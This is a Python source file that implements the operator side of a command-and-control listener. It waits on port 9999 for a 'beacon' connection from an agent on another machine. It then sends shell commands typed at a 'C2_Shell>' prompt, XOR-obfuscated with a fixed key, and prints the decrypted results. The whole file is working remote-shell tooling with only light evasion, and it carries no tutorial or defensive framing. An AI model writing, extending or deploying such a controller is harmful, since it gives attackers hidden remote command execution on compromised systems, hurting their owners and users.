import socket

# Configuration
LISTEN_IP = "0.0.0.0"  # Listen on all local interfaces
LISTEN_PORT = 9999
XOR_KEY = 0x41        # Simple single-byte XOR key ('A')

def xor_cipher(data: bytes, key: int) -> bytes:
    """Encrypts or decrypts data using a simple XOR operation."""
    return bytes([b ^ key for b in data])

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Allow immediate reuse of the port after closing
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    server.bind((LISTEN_IP, LISTEN_PORT))
    server.listen(1)
    print(f"[*] Listening for incoming beacon on {LISTEN_IP}:{LISTEN_PORT}...")
    
    conn, addr = server.accept()
    print(f"[+] Active connection established from: {addr[0]}:{addr[1]}")
    
    try:
        while True:
            # Get command from the operator
            cmd = input("C2_Shell> ").strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                # Tell agent to shut down cleanly
                encrypted_exit = xor_cipher(b"exit", XOR_KEY)
                conn.send(encrypted_exit)
                break
                
            # 1. Encrypt the plaintext string to raw bytes
            encrypted_cmd = xor_cipher(cmd.encode('utf-8'), XOR_KEY)
            
            # 2. Send the payload across the wire
            conn.send(encrypted_cmd)
            
            # 3. Read response (Buffer size 4096 bytes for testing)
            cipher_response = conn.recv(4096)
            if not cipher_response:
                print("[-] Connection lost.")
                break
                
            # 4. Decrypt and display output
            plaintext_response = xor_cipher(cipher_response, XOR_KEY).decode('utf-8', errors='ignore')
            print(plaintext_response)
            
    except KeyboardInterrupt:
        print("\n[*] Shutting down listener.")
    finally:
        conn.close()
        server.close()

if __name__ == "__main__":
    start_server()